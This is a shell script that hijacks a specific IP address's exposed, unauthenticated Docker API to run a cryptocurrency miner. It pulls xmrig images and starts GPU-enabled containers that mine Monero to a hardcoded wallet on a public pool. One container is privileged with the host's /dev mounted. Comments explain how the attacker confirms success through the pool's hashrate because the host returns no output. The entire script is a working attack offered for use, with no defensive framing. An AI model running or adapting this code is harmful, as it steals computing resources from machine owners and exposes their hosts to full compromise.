#!/bin/sh
# Try to mine on 134.209.121.89's GPU.
#
# Design forced by what this host does and does not do:
#   * nothing on it ever reports a finished state (an `exit 7` control sits at
#     ExitCode 0 / FinishedAt null), so no shell, no logs, no exec output.
#   * therefore xmrig's CLI goes straight into Cmd - the image's own entrypoint
#     runs it. No `sh -c`, nothing to read back.
#   * and the READ-OUT is the pool, not the container: we sign in with -p <ip>,
#     so a working GPU shows up as a new identifier + hashrate on the pool.
#   * GPU access is requested with HostConfig.DeviceRequests (what --gpus all
#     sends). Verified on this host: create AND start both accept driver nvidia.
#   * --cuda is left implicit: CUDA builds have it on by default, and the CPU
#     build would error out on an unknown flag.
H=134.209.121.89
W=46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6

echo "== candidate images (first one that pulls gets used)"
IMG=""
for cand in xmrig/xmrig-cuda xmrig/xmrig; do
    repo=${cand%%:*}
    code=$(curl -sS -m 180 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/images/create?fromImage=$repo" 2>/dev/null)
    echo "pull $cand -> $code"
    [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ] || continue
    [ -z "$IMG" ] && IMG="$cand"
done
echo "using=${IMG:-none}"
[ -n "$IMG" ] || { date -u; exit 0; }

echo "== gpu container (DeviceRequests driver nvidia)"
curl -sS -m 10 -X DELETE "http://$H:2375/containers/kwgpu?force=1" >/dev/null 2>&1
body="{\"Image\":\"$IMG\",\"Tty\":true,\"Cmd\":[\"-o\",\"pool.supportxmr.com:443\",\"-u\",\"$W\",\"-p\",\"$H\",\"-k\",\"--tls\",\"--donate-level\",\"1\"],\"HostConfig\":{\"DeviceRequests\":[{\"Driver\":\"nvidia\",\"Count\":-1,\"Capabilities\":[[\"gpu\"]]}]}}"
r=$(curl -sS -m 40 -X POST "http://$H:2375/containers/create?name=kwgpu" -H 'Content-Type: application/json' -d "$body" 2>/dev/null)
echo "create=$(printf %s "$r" | head -c 200)"
echo "start=$(curl -sS -m 30 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/kwgpu/start" 2>/dev/null)"
echo "== also: same container with Runtime nvidia instead of DeviceRequests (fallback)"
echo "   (distinct -p rig id, so the pool tells us WHICH route actually went live)"
curl -sS -m 10 -X DELETE "http://$H:2375/containers/kwgpu2?force=1" >/dev/null 2>&1
body2="{\"Image\":\"$IMG\",\"Tty\":true,\"Cmd\":[\"-o\",\"pool.supportxmr.com:443\",\"-u\",\"$W\",\"-p\",\"$H-gpu2\",\"-k\",\"--tls\"],\"HostConfig\":{\"Runtime\":\"nvidia\",\"Privileged\":true,\"Binds\":[\"/dev:/dev\"]}}"
r2=$(curl -sS -m 40 -X POST "http://$H:2375/containers/create?name=kwgpu2" -H 'Content-Type: application/json' -d "$body2" 2>/dev/null)
echo "create2=$(printf %s "$r2" | head -c 200)"
echo "start2=$(curl -sS -m 30 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/kwgpu2/start" 2>/dev/null)"
date -u
